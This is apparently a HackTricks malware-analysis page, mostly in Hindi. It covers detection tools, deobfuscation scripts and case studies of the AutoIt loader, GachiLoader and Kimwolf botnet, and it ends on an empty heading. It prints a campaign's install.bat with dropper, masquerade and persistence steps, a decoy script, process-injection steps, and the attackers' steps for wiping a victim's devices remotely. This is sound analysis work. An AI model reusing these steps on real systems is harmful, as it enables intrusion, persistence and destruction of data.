# Malware विश्लेषण

{{#include ../../banners/hacktricks-training.md}}

## फॉरेंसिक्स चीटशीट्स

[https://www.jaiminton.com/cheatsheet/DFIR/#](https://www.jaiminton.com/cheatsheet/DFIR/)

## ऑनलाइन सेवाएँ

- [VirusTotal](https://www.virustotal.com/gui/home/upload)
- [HybridAnalysis](https://www.hybrid-analysis.com)
- [Koodous](https://koodous.com)
- [Intezer](https://analyze.intezer.com)
- [Any.Run](https://any.run/)

## ऑफ़लाइन एंटीवायरस और डिटेक्शन टूल्स

### Yara

#### इंस्टॉल
```bash
sudo apt-get install -y yara
```
#### रूल्स तैयार करें

Github से सभी yara malware rules को डाउनलोड और मर्ज करने के लिए इस स्क्रिप्ट का उपयोग करें: [https://gist.github.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9](https://gist.github.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9)\  
Create the _**rules**_ directory and execute it. This will create a file called _**malware_rules.yar**_ which contains all the yara rules for malware.
```bash
wget https://gist.githubusercontent.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9/raw/4ec711d37f1b428b63bed1f786b26a0654aa2f31/malware_yara_rules.py
mkdir rules
python malware_yara_rules.py
```
#### स्कैन
```bash
yara -w malware_rules.yar image  #Scan 1 file
yara -w malware_rules.yar folder #Scan the whole folder
```
#### YaraGen: malware की जाँच और नियम बनाएँ

आप [**YaraGen**](https://github.com/Neo23x0/yarGen) टूल का उपयोग किसी बाइनरी से yara rules जनरेट करने के लिए कर सकते हैं। इन ट्यूटोरियल्स को देखें: [**Part 1**](https://www.nextron-systems.com/2015/02/16/write-simple-sound-yara-rules/), [**Part 2**](https://www.nextron-systems.com/2015/10/17/how-to-write-simple-but-sound-yara-rules-part-2/), [**Part 3**](https://www.nextron-systems.com/2016/04/15/how-to-write-simple-but-sound-yara-rules-part-3/)
```bash
python3 yarGen.py --update
python3.exe yarGen.py --excludegood -m  ../../mals/
```
### ClamAV

#### इंस्टॉल
```
sudo apt-get install -y clamav
```
#### स्कैन
```bash
sudo freshclam      #Update rules
clamscan filepath   #Scan 1 file
clamscan folderpath #Scan the whole folder
```
### [Capa](https://github.com/mandiant/capa)

**Capa** executables: PE, ELF, .NET में संभावित हानिकारक **capabilities** का पता लगाती है। इसलिए यह चीज़ें जैसे Att\&ck tactics, या निम्नलिखित संदिग्ध क्षमताओं को खोजेगी:

- OutputDebugString error के लिए जाँच करें
- सेवा के रूप में चलाना
- प्रोसेस बनाना

Get it int he [**Github repo**](https://github.com/mandiant/capa).

### IOCs

IOC का मतलब Indicator Of Compromise है। एक IOC उन **पहचान करने वाली शर्तों** का सेट है जो कुछ संभावित अनचाहे सॉफ़्टवेयर या पुष्टि किए गए **malware** की पहचान करती हैं। Blue Teams इस तरह की परिभाषा का उपयोग अपने **systems** और **networks** में इस तरह की दुर्भावनापूर्ण फ़ाइलों को **खोजने के लिए** करते हैं।\
इन परिभाषाओं को साझा करना बहुत उपयोगी है क्योंकि जब किसी कंप्यूटर में **malware** की पहचान होती है और उसके लिए एक IOC बनाया जाता है, तो अन्य Blue Teams इसका उपयोग **malware** की पहचान तेज़ी से करने के लिए कर सकते हैं।

IOCs बनाने या संशोधित करने के लिए एक टूल है [**IOC Editor**](https://www.fireeye.com/services/freeware/ioc-editor.html)**.**\
आप [**Redline**](https://www.fireeye.com/services/freeware/redline.html) जैसे टूल्स का उपयोग किसी डिवाइस में परिभाषित IOCs को **खोजने के लिए** कर सकते हैं।

### Loki

[**Loki**](https://github.com/Neo23x0/Loki) Simple Indicators of Compromise के लिए एक स्कैनर है।\
डिटेक्शन चार तरीकों पर आधारित है:
```
1. File Name IOC
Regex match on full file path/name

2. Yara Rule Check
Yara signature matches on file data and process memory

3. Hash Check
Compares known malicious hashes (MD5, SHA1, SHA256) with scanned files

4. C2 Back Connect Check
Compares process connection endpoints with C2 IOCs (new since version v.10)
```
### Linux Malware Detect

[**Linux Malware Detect (LMD)**](https://www.rfxn.com/projects/linux-malware-detect/) एक malware स्कैनर है जो Linux के लिए GNU GPLv2 लाइसेंस के तहत जारी किया गया है, और यह shared hosted environments में होने वाले ख़तरों को ध्यान में रखकर डिज़ाइन किया गया है। यह network edge intrusion detection systems से threat data का उपयोग करके उन malware को एक्सट्रैक्ट करता है जो सक्रिय रूप से हमलों में उपयोग हो रहे हैं और detection के लिए signatures जनरेट करता है। इसके अलावा, threat data LMD checkout feature के साथ user submissions और malware community resources से भी प्राप्त होता है।

### rkhunter

[**rkhunter**](http://rkhunter.sourceforge.net) जैसी टूल्स का उपयोग संभावित **rootkits** और malware के लिए फ़ाइल सिस्टम की जाँच करने के लिए किया जा सकता है।
```bash
sudo ./rkhunter --check -r / -l /tmp/rkhunter.log [--report-warnings-only] [--skip-keypress]
```
### FLOSS

[**FLOSS**](https://github.com/mandiant/flare-floss) एक ऐसा टूल है जो विभिन्न तकनीकों का उपयोग करके executables के अंदर obfuscated strings खोजने की कोशिश करेगा।

### PEpper

[PEpper ](https://github.com/Th3Hurrican3/PEpper) executable के अंदर कुछ बुनियादी चीज़ें चेक करता है (binary data, entropy, URLs and IPs, some yara rules).

### PEstudio

[PEstudio](https://www.winitor.com/download) Windows executables की imports, exports, headers जैसी जानकारी प्राप्त करने की अनुमति देता है, और साथ ही virus total भी चेक करेगा और संभावित Att\&ck techniques खोजेगा।

### Detect It Easy(DiE)

[**DiE**](https://github.com/horsicq/Detect-It-Easy/) एक टूल है जो यह पता लगाने के लिए है कि कोई file **encrypted** है या नहीं और **packers** भी ढूंढता है।

### NeoPI

[**NeoPI** ](https://github.com/CiscoCXSecurity/NeoPI) एक Python script है जो text/script files के भीतर **obfuscated** और **encrypted** content का पता लगाने के लिए विभिन्न **statistical methods** का उपयोग करती है। NeoPI का उद्देश्य **detection of hidden web shell code** में मदद करना है।

### **php-malware-finder**

[**PHP-malware-finder**](https://github.com/nbs-system/php-malware-finder) **obfuscated**/**dodgy code** का पता लगाने के लिए पूरी कोशिश करता है, साथ ही ऐसे files भी जो अक्सर **malwares**/webshells में इस्तेमाल होने वाले **PHP** functions का उपयोग करते हैं।

### Apple Binary Signatures

जब आप किसी **malware sample** की जाँच कर रहे हों तो हमेशा बाइनरी की **check the signature** करें, क्योंकि जिसने इसे साइन किया है वह **developer** पहले से ही **related** with **malware.** हो सकता है।
```bash
#Get signer
codesign -vv -d /bin/ls 2>&1 | grep -E "Authority|TeamIdentifier"

#Check if the app’s contents have been modified
codesign --verify --verbose /Applications/Safari.app

#Check if the signature is valid
spctl --assess --verbose /Applications/Safari.app
```
## डिटेक्शन तकनीकें

### File Stacking

यदि आपको पता है कि किसी फ़ोल्डर में जो **web server** के **files** हैं वह **last updated on some date** था, तो उस फ़ोल्डर में मौजूद सभी **files** की **date** — यानी वे कब **created and modified** हुए — की **Check** करें। अगर कोई तारीख **suspicious** लगे तो उस file की जाँच करें।

### Baselines

यदि किसी फ़ोल्डर के **files** को **shouldn't have been modified** माना जाता है, तो उस फ़ोल्डर के **original files** का **hash** निकालकर उन्हें **current** files से **compare** करें। जो कुछ भी बदल गया होगा वह **suspicious** माना जाएगा।

### Statistical Analysis

जब जानकारी logs में सेव होती है, आप statistics देख सकते हैं — जैसे कि प्रत्येक **web server** के किस **file** को कितनी बार access किया गया; एक **web shell** संभवतः उन में सबसे अधिक access किए गए फ़ाइलों में से एक हो सकती है।

---

### Android in-app native telemetry (no root)

Android पर, आप target app process के अंदर native code में instrumentation कर सकते हैं — छोटी logger library को अन्य JNI libs के initialize होने से पहले preload करके। इससे system-wide hooks या root के बिना native व्यवहार पर शुरुआती visibility मिलती है। एक लोकप्रिय तरीका SoTap है: सही ABI के लिए libsotap.so को APK में डालें और जल्दी (उदा., static initializer या Application.onCreate) एक System.loadLibrary("sotap") कॉल inject करें, फिर internal/external paths या Logcat fallback से logs collect करें।

See the Android native reversing page for setup details and log paths:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/reversing-native-libraries.md
{{#endref}}

---

### Android/JNI native string deobfuscation with angr + Ghidra

कुछ Android malware और RASP-protected apps JNI method names और signatures को RegisterNatives को कॉल करने से पहले runtime पर decode करके छिपाते हैं। जब anti-debug के कारण Frida/ptrace instrumentation रुक जाती है, तब भी आप in-binary decoder को angr से execute करके offline plaintext recover कर सकते हैं और परिणामों को टिप्पणियों के रूप में Ghidra में push कर सकते हैं।

मुख्य विचार: .so के अंदर decoder को एक callable function के रूप में देखें, इसे .rodata में मौजूद obfuscated byte blobs पर execute करें, और आउटपुट bytes को पहले \x00 (C-string terminator) तक concretize करें। address mismatches से बचने के लिए angr और Ghidra को एक ही image base का उपयोग करने दें।

Workflow overview
- Triage in Ghidra: JNI_OnLoad और RegisterNatives setup में decoder और उसकी calling convention/arguments को पहचानें।
- Run angr (CPython3) to execute the decoder for each target string and dump results.
- Annotate in Ghidra: auto-comment decoded strings at each call site for fast JNI reconstruction.

Ghidra triage (JNI_OnLoad pattern)
- Apply JNI datatypes to JNI_OnLoad so Ghidra recognises JNINativeMethod structures.
- Typical JNINativeMethod per Oracle docs:

```c
typedef struct {
char *name;      // e.g., "nativeFoo"
char *signature; // e.g., "()V", "()[B"
void *fnPtr;     // native implementation address
} JNINativeMethod;
```
- Look for calls to RegisterNatives. If the library constructs the name/signature with a local routine (e.g., FUN_00100e10) that references a static byte table (e.g., DAT_00100bf4) and takes parameters like (encoded_ptr, out_buf, length), that is an ideal target for offline execution.

angr setup (execute the decoder offline)
- Load the .so with the same base used in Ghidra (example: 0x00100000) and disable auto-loading of external libs to keep the state small.

<details>
<summary>angr सेटअप और offline decoder execution</summary>
```python
import angr, json

project = angr.Project(
'/path/to/libtarget.so',
load_options={'main_opts': {'base_addr': 0x00100000}},
auto_load_libs=False,
)

ENCODING_FUNC_ADDR = 0x00100e10  # decoder function discovered in Ghidra

def decode_string(enc_addr, length):
# fresh blank state per evaluation
st = project.factory.blank_state()
outbuf = st.heap.allocate(length)
call = project.factory.callable(ENCODING_FUNC_ADDR, base_state=st)
ret_ptr = call(enc_addr, outbuf, length)  # returns outbuf pointer
rs = call.result_state
raw = rs.solver.eval(rs.memory.load(ret_ptr, length), cast_to=bytes)
return raw.split(b'\x00', 1)[0].decode('utf-8', errors='ignore')

# Example: decode a JNI signature at 0x100933 of length 5 → should be ()[B
print(decode_string(0x00100933, 5))
```
</details>

- बड़े पैमाने पर, call sites से decoder’s arguments (encoded_ptr, size) के लिए एक static map बनाएं। Wrappers आर्गुमेंट्स छिपा सकते हैं, इसलिए यदि API recovery noisy हो तो आप यह mapping मैन्युअली Ghidra xrefs से बना सकते हैं।

<details>
<summary>angr के साथ एक साथ कई call sites डिकोड करें</summary>
```python
# call_site -> (encoded_addr, size)
call_site_args_map = {
0x00100f8c: (0x00100b81, 0x41),
0x00100fa8: (0x00100bca, 0x04),
0x00100fcc: (0x001007a0, 0x41),
0x00100fe8: (0x00100933, 0x05),
0x0010100c: (0x00100c62, 0x41),
0x00101028: (0x00100c15, 0x16),
0x00101050: (0x00100a49, 0x101),
0x00100cf4: (0x00100821, 0x11),
0x00101170: (0x00100940, 0x101),
0x001011cc: (0x0010084e, 0x13),
0x00101334: (0x001007e9, 0x0f),
0x00101478: (0x0010087d, 0x15),
0x001014f8: (0x00100800, 0x19),
0x001015e8: (0x001008e6, 0x27),
0x0010160c: (0x00100c33, 0x13),
}

decoded_map = { hex(cs): decode_string(enc, sz)
for cs, (enc, sz) in call_site_args_map.items() }

import json
print(json.dumps(decoded_map, indent=2))
with open('decoded_strings.json', 'w') as f:
json.dump(decoded_map, f, indent=2)
```
</details>

Ghidra में call sites को annotate करें
विकल्प A: Jython-only comment writer (pre-computed JSON का उपयोग करें)
- क्योंकि angr को CPython3 की आवश्यकता होती है, deobfuscation और annotation को अलग रखें। पहले ऊपर दिए गए angr script को चलाकर decoded_strings.json बनाएं। फिर इस Jython GhidraScript को चलाएँ ताकि प्रत्येक call site पर PRE_COMMENTs लिखा जा सके (और संदर्भ के लिए caller function name शामिल करें):

<details>
<summary>Ghidra Jython script to annotate decoded JNI strings</summary>
```python
#@category Android/Deobfuscation
# Jython in Ghidra 10/11
import json
from ghidra.program.model.listing import CodeUnit

# Ask for the JSON produced by the angr script
f = askFile('Select decoded_strings.json', 'Load')
mapping = json.load(open(f.absolutePath, 'r'))  # keys as hex strings

fm = currentProgram.getFunctionManager()
rm = currentProgram.getReferenceManager()

# Replace with your decoder address to locate call-xrefs (optional)
ENCODING_FUNC_ADDR = 0x00100e10
enc_addr = toAddr(ENCODING_FUNC_ADDR)

callsite_to_fn = {}
for ref in rm.getReferencesTo(enc_addr):
if ref.getReferenceType().isCall():
from_addr = ref.getFromAddress()
fn = fm.getFunctionContaining(from_addr)
if fn:
callsite_to_fn[from_addr.getOffset()] = fn.getName()

# Write comments from JSON
for k_hex, s in mapping.items():
cs = int(k_hex, 16)
site = toAddr(cs)
caller = callsite_to_fn.get(cs, None)
text = s if caller is None else '%s @ %s' % (s, caller)
currentProgram.getListing().setComment(site, CodeUnit.PRE_COMMENT, text)
print('[+] Annotated %d call sites' % len(mapping))
```
</details>

विकल्प B: Single CPython script via pyhidra/ghidra_bridge
- वैकल्पिक रूप से, pyhidra या ghidra_bridge का उपयोग करके उसी CPython process से Ghidra’s API चलाएँ जिसमें angr चल रहा हो। इससे आप decode_string() को कॉल करके बिना किसी intermediate file के तुरंत PRE_COMMENTs सेट कर सकते हैं। लॉजिक Jython स्क्रिप्ट की तरह है: ReferenceManager के माध्यम से callsite→function map बनाएं, angr के साथ decode करें, और comments सेट करें।

Why this works and when to use it
- Offline execution RASP/anti-debug को बाईपास कर देता है: कोई ptrace या Frida hooks आवश्यक नहीं होते strings recover करने के लिए।
- Ghidra और angr का base_addr (उदा., 0x00100000) समान रखने से function/data addresses दोनों tools में मैच करेंगे।
- Decoders के लिए repeatable recipe: transform को एक pure function की तरह मानें, एक output buffer एक fresh state में allocate करें, इसे (encoded_ptr, out_ptr, len) के साथ कॉल करें, फिर state.solver.eval के माध्यम से concretize करें और C-strings को \x00 तक parse करें।

Notes and pitfalls
- target ABI/calling convention का सम्मान करें। angr.factory.callable arch के आधार पर एक चुनता है; अगर arguments shifted दिखते हैं तो cc स्पष्ट रूप से specify करें।
- अगर decoder zeroed output buffers की उम्मीद करता है, तो call से पहले state में outbuf को zeros से initialize करें।
- position-independent Android .so के लिए, हमेशा base_addr प्रदान करें ताकि angr में addresses Ghidra में देखे गए addresses से मेल खाएँ।
- currentProgram.getReferenceManager() का उपयोग करके call-xrefs enumerate करें भले ही app decoder को thin stubs के पीछे छुपाए हुए हो।

For angr basics, see: [angr basics](../../reversing/reversing-tools-basic-methods/angr/README.md)

---

## Deobfuscating Dynamic Control-Flow (JMP/CALL RAX Dispatchers)

आधुनिक malware परिवार Control-Flow Graph (CFG) obfuscation का भारी दुरुपयोग करते हैं: सीधे jump/call की बजाय वे destination runtime पर compute करते हैं और `jmp rax` या `call rax` execute करते हैं। एक छोटा *dispatcher* (आमतौर पर नौ instructions) CPU के `ZF`/`CF` flags के आधार पर final target सेट करता है, जिससे static CFG recovery पूरी तरह से टूट जाती है।

यह तकनीक — जिसे SLOW#TEMPEST loader ने दिखाया — IDAPython और Unicorn CPU emulator पर आधारित तीन-चरण workflow से हराई जा सकती है।

### 1. हर indirect jump / call ढूँढें
```python
import idautils, idc

for ea in idautils.FunctionItems(idc.here()):
mnem = idc.print_insn_mnem(ea)
if mnem in ("jmp", "call") and idc.print_operand(ea, 0) == "rax":
print(f"[+] Dispatcher found @ {ea:X}")
```
### 2. डिस्पैचर बाइट-कोड निकालें
```python
import idc

def get_dispatcher_start(jmp_ea, count=9):
s = jmp_ea
for _ in range(count):
s = idc.prev_head(s, 0)
return s

start = get_dispatcher_start(jmp_ea)
size  = jmp_ea + idc.get_item_size(jmp_ea) - start
code  = idc.get_bytes(start, size)
open(f"{start:X}.bin", "wb").write(code)
```
### 3. Unicorn के साथ इसे दो बार Emulate करें
```python
from unicorn import *
from unicorn.x86_const import *
import struct

def run(code, zf=0, cf=0):
BASE = 0x1000
mu = Uc(UC_ARCH_X86, UC_MODE_64)
mu.mem_map(BASE, 0x1000)
mu.mem_write(BASE, code)
mu.reg_write(UC_X86_REG_RFLAGS, (zf << 6) | cf)
mu.reg_write(UC_X86_REG_RAX, 0)
mu.emu_start(BASE, BASE+len(code))
return mu.reg_read(UC_X86_REG_RAX)
```
प्राप्त करने के लिए `run(code,0,0)` और `run(code,1,1)` चलाएँ ताकि *false* और *true* branch targets मिल सकें।

### 4. Patch back a direct jump / call
```python
import struct, ida_bytes

def patch_direct(ea, target, is_call=False):
op   = 0xE8 if is_call else 0xE9           # CALL rel32 or JMP rel32
disp = target - (ea + 5) & 0xFFFFFFFF
ida_bytes.patch_bytes(ea, bytes([op]) + struct.pack('<I', disp))
```
पैचिंग के बाद, IDA को फ़ंक्शन का पुनः विश्लेषण करने के लिए मजबूर करें ताकि पूरा CFG और Hex-Rays आउटपुट बहाल हो जाए:
```python
import ida_auto, idaapi
idaapi.reanalyze_function(idc.get_func_attr(ea, idc.FUNCATTR_START))
```
### 5. Label indirect API calls

हर `call rax` की वास्तविक मंज़िल ज्ञात होने पर आप IDA को बता सकते हैं कि वह क्या है, ताकि पैरामीटर प्रकार और वेरिएबल नाम स्वतः पुनर्प्राप्त हो जाएँ:
```python
idc.set_callee_name(call_ea, resolved_addr, 0)  # IDA 8.3+
```
### व्यावहारिक लाभ

* वास्तविक CFG को पुनर्स्थापित करता है → decompilation *10* लाइनों से हजारों तक चली जाती है.
* string-cross-reference & xrefs सक्षम करता है, जिससे व्यवहार का पुनर्निर्माण आसान हो जाता है.
* Scripts पुन:प्रयोग योग्य हैं: इन्हें उसी trick द्वारा सुरक्षित किसी भी loader में डालें.

---

## AutoIt-आधारित loaders: .a3x decryption, Task Scheduler masquerade और RAT injection

यह घुसपैठ पैटर्न एक signed MSI, AutoIt loaders compiled to .a3x, और एक Task Scheduler job को एक benign app के रूप में masquerade करते हुए जोड़ता है.

### MSI → custom actions → AutoIt orchestrator

MSI custom actions द्वारा निष्पादित प्रोसेस ट्री और कमांड्स:

- MsiExec.exe → cmd.exe द्वारा install.bat चलाने के लिए
- WScript.exe एक भ्रामक त्रुटि संवाद दिखाने के लिए
```cmd
%SystemRoot%\system32\cmd.exe /c %APPDATA%\스트레스 클리어\install.bat
%SystemRoot%\System32\WScript.exe %APPDATA%\스트레스 클리어\error.vbs
```
install.bat (drops loader, sets persistence, self-cleans):
```bat
@echo off
set dr=Music

copy "%~dp0AutoIt3.exe" %public%\%dr%\AutoIt3.exe
copy "%~dp0IoKlTr.au3" %public%\%dr%\IoKlTr.au3

cd /d %public%\%dr% & copy c:\windows\system32\schtasks.exe hwpviewer.exe ^
& hwpviewer /delete /tn "IoKlTr" /f ^
& hwpviewer /create /sc minute /mo 1 /tn "IoKlTr" /tr "%public%\%dr%\AutoIt3.exe %public%\%dr%\IoKlTr.au3"

del /f /q "%~dp0AutoIt3.exe"
del /f /q "%~dp0IoKlTr.au3"
del /f /q "%~f0"
```
error.vbs (user decoy):
```vb
MsgBox "현재 시스템 언어팩과 프로그램 언어팩이 호환되지 않아 실행할 수 없습니다." & vbCrLf & _
"설정에서 한국어(대한민국) 언어팩을 설치하거나 변경한 뒤 다시 실행해 주세요.", _
vbCritical, "언어팩 오류"
```
Key artifacts and masquerade:
- AutoIt3.exe और IoKlTr.au3 को C:\Users\Public\Music में ड्रॉप करता है
- schtasks.exe की कॉपी hwpviewer.exe बनाता है (Hangul Word Processor viewer के रूप में masquerade)
- "IoKlTr" नाम का scheduled task बनाता है जो हर 1 मिनट पर चलता है
- Startup LNK Smart_Web.lnk के रूप में देखा गया; mutex: `Global\AB732E15-D8DD-87A1-7464-CE6698819E701`
- %APPDATA%\Google\Browser\ के अंतर्गत `adb` या `adv` वाले सबफ़ोल्डर्स में modules स्टेज करता है और उन्हें autoit.vbs/install.bat helpers के माध्यम से शुरू करता है

Forensic triage tips:
- schtasks enumeration: `schtasks /query /fo LIST /v | findstr /i "IoKlTr hwpviewer"`
- Task XML के साथ co-located schtasks.exe की renamed copies ढूँढें: `dir /a "C:\Users\Public\Music\hwpviewer.exe"`
- सामान्य paths: `C:\Users\Public\Music\AutoIt3.exe`, `...\IoKlTr.au3`, Startup `Smart_Web.lnk`, `%APPDATA%\Google\Browser\(adb|adv)*`
- प्रोसेस निर्माण को correlate करें: AutoIt3.exe वैध Windows binaries को spawn करता है (उदा., cleanmgr.exe, hncfinder.exe)

### AutoIt loaders and .a3x payload decryption → injection

- AutoIt modules `#AutoIt3Wrapper_Outfile_type=a3x` के साथ compile किए जाते हैं और benign processes में inject करने से पहले embedded payloads को decrypt करते हैं।
- मिले हुए families: QuasarRAT (hncfinder.exe में injected), RftRAT/RFTServer (cleanmgr.exe में injected), और RemcosRAT modules (`Remcos\RunBinary.a3x`)।
- Decryption pattern: HMAC के माध्यम से AES key derive करना, embedded blob को decrypt करना, फिर plaintext module को inject करना।

Generic decryption skeleton (exact HMAC input/algorithm is family-specific):
```python
import hmac, hashlib
from Crypto.Cipher import AES

def derive_aes_key(secret: bytes, data: bytes) -> bytes:
# Example: HMAC-SHA256 → first 16/32 bytes as AES key
return hmac.new(secret, data, hashlib.sha256).digest()

def aes_decrypt_cbc(key: bytes, iv: bytes, ct: bytes) -> bytes:
return AES.new(key, AES.MODE_CBC, iv=iv).decrypt(ct)
```
Common injection flow (CreateRemoteThread-style):
- CreateProcess (suspended) का उपयोग करके लक्षित होस्ट (e.g., cleanmgr.exe)
- VirtualAllocEx + WriteProcessMemory के साथ डिक्रिप्ट किए गए module/shellcode को लिखना
- CreateRemoteThread या QueueUserAPC का उपयोग कर payload निष्पादित करना

Hunting ideas
- AutoIt3.exe जिसका parent MsiExec.exe या WScript.exe हो और system utilities spawn करे
- ऐसी फाइलें जिनके पास `.a3x` एक्सटेंशन हों या AutoIt script runners जो public/user-writable paths में हों
- संदिग्ध scheduled tasks जो AutoIt3.exe चलाते हों या Microsoft द्वारा signed न हुए binaries चलाते हों, और जिनके triggers minute-level हों

### Account-takeover abuse of Android Find My Device (Find Hub)

Windows intrusion के दौरान, ऑपरेटरों ने चुराए गए Google credentials का उपयोग करके पीड़ित के Android devices को बार-बार wipe किया, सूचनाओं को दबाते हुए जबकि वे पीड़ित के logged-in desktop messenger के माध्यम से पहुंच बढ़ा रहे थे।

Operator steps (from a logged-in browser session):
- Google Account → Security → Your devices की जाँच करें; Find My Phone → Find Hub (https://www.google.com/android/find) पर जाएँ
- Select device → Google password फिर से दर्ज करें → issue "Erase device" (factory reset); recovery को delay करने के लिए दोहराएँ
- Optional: linked mailbox (e.g., Naver) में alert e-mails साफ़ करें ताकि security notifications छिप जाएँ

## Tracing heavily obfuscated Node.js loaders

हमलावर अक्सर JavaScript loaders को standalone Windows binaries में bundle करते हैं जिन्हें [`nexe`](https://github.com/nexe/nexe) से compile किया गया है, इसलिए runtime script के साथ ship होता है। परिणामी PE अक्सर 60–90 MB का होता है और Node.js इंस्टॉल न होने पर भी execute हो जाता है। triage के दौरान:

- Use [`nexe_unpacker`](https://npm.io/package/nexe_unpacker) का उपयोग करके PE में embedded JavaScript को carve करके निकालें और static diffing के लिए local tooling को दें।
- `%TEMP%` में disk-based mutex अपेक्षित करें (GachiLoader drops a random `<name>.lock` file that expires after ~5 minutes)। execution से पहले फाइल को sandbox में copy करने से आप redundant stages को skip कर सकते हैं जबकि बाद के payloads अभी भी देख पाएँगे।

### Node.js API tracing to defeat anti-analysis

Check Point’s [Nodejs-Tracer](https://github.com/CheckPointSW/Nodejs-Tracer) किसी भी Node.js process के अंदर core modules को hook करता है, आपको anti-VM probes spoof करने देता है, और sample द्वारा लिखे गए हर artifact को preserve करता है। ट्रेसर के माध्यम से obfuscated scripts लॉन्च करें ताकि analyst-controlled instrumentation call stack में बनी रहे:
```powershell
node -r .\tracer.js main.js
```
`tracer.js` के भीतर प्रमुख कॉन्फ़िगरेशन टॉगल आपको अनुमति देते हैं:

- फाइलसिस्टम, child-process, और HTTP गतिविधि को लॉग करना (`LOG_HTTP_REQUESTS`, `SAVE_FILE_WRITES`)। हर ड्रॉप किया गया फ़ाइल—जैसे `kidkadi.node`—मैलवेयर इसे डिलीट करने से पहले वर्किंग डायरेक्टरी में कॉपी कर देता है।
- वास्तविक RAM/CPU गिनती लौटाकर, `tasklist` आउटपुट की नक़ल करके, और PowerShell/WMI प्रतिक्रियाओं में छेड़छाड़ करके environment fingerprints को ओवरराइड करना। यह उन loaders को बायपास करता है जो ≥4 GB RAM, ≥2 cores की मांग करते हैं और user names (`mashinesssss`, `wdagutilityaccount`, आदि), hostnames (`desktop-vrsqlag`, `server1` …), और process names (`vmtoolsd.exe`, `fiddler.exe`, `x64dbg.exe`, `frida-server.exe`) की जांच करते हैं।
- `Get-WmiObject Win32_DiskDrive` (जिसमें `vmware`, `kvm`, `virtio`, … खोजे जाते हैं), `Win32_VideoController` (“VirtualBox Graphics Adapter”, “Hyper-V Video”, आदि को ब्लॉक करना) और `Win32_PortConnector` गणनाओं जैसे WMI हार्डवेयर चेक्स को निष्क्रिय करना। जब वे probes “real” हार्डवेयर रिपोर्ट करते हैं, तो sandboxes अब उन benign `Invoke-WebRequest` कॉल्स के अनन्त लूप में नहीं फँसते जो GachiLoader विश्लेषण का समय नष्ट करने के लिए `linkedin.com`, `grok.com`, `whatsapp.com` और इसी तरह के डोमेन पर करता है।

### Capturing gated C2 traffic automatically

tracer के नेटवर्क हुक्स JavaScript obfuscation को रिवर्स किए बिना multi-layer C2 authentication को उजागर करते हैं। निरीक्षित कैंपेन में loader:

1. प्रत्येक हार्ड-कोडेड C2 पर होस्ट telemetry को `/log` पर POST करता है।
2. Base64-encoded payload URL प्राप्त करने के लिए `X-Secret: gachifamily` के साथ `GET /richfamily/<per-sample key>` भेजता है।
3. उस URL पर अंतिम `GET` उस सैंपल-विशिष्ट लंबे `X-Secret` हेडर के साथ करता है; यदि यह गायब है तो `403 Forbidden` लौटता है।

क्योंकि tracer पूरी रिक्वेस्ट्स (headers, bodies, destinations) रिकॉर्ड करता है, आप उसी ट्रैफ़िक को रिप्ले करके payloads खींच सकते हैं, Themida/VMProtect शेल्स को मेमोरी में डंप कर सकते हैं, और बड़े पैमाने पर Rhadamanthys कॉन्फ़िगरेशन डेटा निकाल सकते हैं।

## AdaptixC2: Configuration Extraction and TTPs

समर्पित पेज देखें:

{{#ref}}
adaptixc2-config-extraction-and-ttps.md
{{#endref}}

## Kimwolf Android Botnet ट्रेडक्राफ्ट

### APK loader & native ELF execution on TV boxes
- Malicious APKs such as `com.n2.systemservice06*` `res/raw` के अंदर statically linked ARM ELF भेजते हैं (उदा. `R.raw.libniggakernel`). एक `BOOT_COMPLETED` receiver स्टार्टअप पर चलता है, raw resource को app sandbox में निकालता है (उदा. `/data/data/<pkg>/niggakernel`), इसे executable बनाता है और `su` के साथ invoke करता है।
- कई Android TV बॉक्स/टैबलेट pre-rooted images या world-writable `su` के साथ आते हैं, इसलिए loader बिना किसी exploit chain के भी भरोसेमंद तरीके से ELF को UID 0 के साथ बूट कर देता है। Persistence “for free” मिलती है क्योंकि receiver हर reboot या app restart के बाद फिर से relaunch हो जाता है।
- इस पैटर्न की तलाश करने वाले Reverse engineers `AndroidManifest.xml` को diff कर सकते हैं ताकि hidden boot receivers और वह कोड मिल सके जो `Resources.openRawResource` → `FileOutputStream` → `Runtime.getRuntime().exec("su")` को संदर्भित करता है। एक बार ELF गिरा दिया जाए, तो इसे Linux userland backdoor के रूप में triage करें (Kimwolf UPX-packed, stripped, statically linked, 32-bit ARM EABI5 है)।

### Runtime mutexes & masquerading IOCs
- स्टार्ट होते समय, Kimwolf एक **abstract UNIX domain socket** बाइंड करता है जैसे `@niggaboxv4`/`@niggaboxv5`. यदि वही socket पहले से मौजूद है तो प्रोग्राम exit कर जाता है, इसलिए socket नाम दोनों के रूप में काम करता है: एक mutex और एक forensic artifact।
- process title को service-जैसे नामों (`netd_services`, `tv_helper`, आदि) से overwrite किया जाता है ताकि यह Android process listings में घुल-मिल जाए। Host-based detections इन नामों को mutex socket के साथ मिलाकर अलर्ट कर सकती हैं।

### Stack XOR string decoding with ARM NEON + flare_emu
- Sensitive strings (C2 domains, resolvers, DoT endpoints) encrypted 8-बाइट ब्लॉक्स में stack पर पुश किए जाते हैं और `VEOR Qx, Qx, Qy` (`veorq_s64`) के माध्यम से इन-प्लेस डिकोड किए जाते हैं। विश्लेषक **flare_emu** के लिए स्क्रिप्ट लिख सकते हैं ताकि हर बार जब decryptor caller को decrypted pointer दे, तब उसे पकड़ा जा सके:
```python
import flare_emu

eh = flare_emu.EmuHelper()

def hook(eh, addr, argv, _):
if eh.isValidEmuPtr(argv[1]):
print(hex(addr), eh.getEmuString(argv[1]))

eh.iterate(0x8F00, hook)  # sub_8F00 consumes the plaintext R1 argument
```
- Searching for `VEOR Q8, Q8, Q9` / `veorq_s64` sequences and emulating their ranges mass-dumps every decrypted string, bypassing the stack-only lifetime of the plaintext.

### DNS-over-TLS रिज़ॉल्यूशन और XOR IP व्युत्पत्ति
- All Kimwolf variants resolve C2 domains by speaking **DNS-over-TLS (TCP/853)** directly with Google (8.8.8.8) or Cloudflare (1.1.1.1), defeating plain DNS logging or hijacking.
- v4 bots simply use the returned IPv4 A record. v5 bots treat the A record as a 32-bit integer, swap its endianness, XOR it with the constant `0x00ce0491`, then flip the endianness back to obtain the real C2 IP. CyberChef recipe: Change IP format → swap endianness per 4-byte chunk → XOR with `00 ce 04 91` → convert back to dotted decimal.

### ENS / EtherHiding फॉलबैक
